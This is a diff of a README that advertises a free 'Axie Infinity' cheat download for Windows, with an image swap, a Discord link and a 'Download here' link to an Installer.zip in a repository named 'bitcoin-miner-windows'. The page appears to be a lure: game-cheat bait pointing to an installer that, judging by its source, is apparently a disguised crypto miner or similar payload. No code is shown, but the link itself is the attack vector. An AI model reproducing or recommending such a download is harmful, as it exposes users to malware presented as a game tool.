@@ -1,11 +1,14 @@
 # Axie Infinity
 Axie Infinity Cheat Download Download Cheat 2023 PC Free Install Now for Windows 7, 8.1 &amp; 10 compatibility testing for Windows XP, Vista
 
-![valorant-anti-cheat-hacker-100000-riot-games-vanguard](https://user-images.githubusercontent.com/118502462/206792597-569dbe81-d547-4a06-b251-cd4332f72f53.jpg)
+
+![axie-infinity-screenshot-01](https://user-images.githubusercontent.com/118502462/206926309-59be639a-a36b-4758-a087-9ed1677515af.png)
 
 # Axie Infinity Hack Download Windows Install Now for Window
 
 <a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a><br>
+
+
 <a href="https://discord.gg/yWcTb9BX">Discord Chat </a>
 
 ## Description
